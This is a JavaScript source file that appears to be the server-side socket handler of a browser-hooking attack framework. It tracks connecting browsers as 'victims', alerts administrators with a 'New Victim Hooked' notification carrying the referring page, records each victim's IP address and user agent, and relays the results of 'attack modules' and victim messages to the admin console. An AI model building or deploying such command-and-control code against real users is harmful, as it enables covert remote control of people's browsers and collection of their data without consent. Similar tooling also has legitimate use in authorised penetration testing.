const adminSocket = require('../admin/sockets')

module.exports.sockets = {}
//id for sockets which we increment. This should eventually be stored in a database
let visibleIdIndex = 1
let visibleIdsBySessionId = {}

module.exports.configure = function(io){
  io.on('connection', function(socket){
    
    console.log('a user connected')

    socket.join('users')
    
    const newUser = buildNewUser(socket)
    adminSocket.emit('newUser', newUser)
    module.exports.sockets[newUser.id] = newUser


    //when an attack module has finished running. Relay it back to the admins
    socket.on('result', function(data){
      adminSocket.emit('result', data)
    })

    //forward messages from victims
    socket.on('message', function(data){
      adminSocket.emit('message', data)
    })

    //when user disconnects, let admin know
    socket.on('disconnect', function(){
      disconnect(socket)
      console.log("user disconnected")
    })

  })
}

function buildNewUser(socket){

  const clientIp = socket.handshake.address
  const clientAgent = socket.handshake.headers['user-agent']
  socket._id = visibleIdsBySessionId[socket.handshake.session.id]
  if(!socket._id) {
    socket._id = visibleIdIndex++
    visibleIdsBySessionId[socket.handshake.session.id] = socket._id
    adminSocket.emit('notify', {
      title: 'New Victim Hooked',
      options: {
        body: socket.handshake.headers['referer']
      }
    })
  }
    
  //store the id number of the socket on it in a new property
  return{
    id: socket._id,
    socketId: socket.id,
    //address is in the form ::ffff:000.000.000.000
    ip: clientIp.slice(clientIp.lastIndexOf(':') + 1),
    agent: clientAgent.slice(clientAgent.indexOf('(') + 1,clientAgent.indexOf(')')),
    connectedAt: new Date(socket.handshake.time)
  }
}

function disconnect(socket){
  adminSocket.emit('userLeft', {
    id: socket._id,
    socketId: socket.id
  })

  //remove socket from active sockets array
  delete module.exports.sockets[socket._id]
}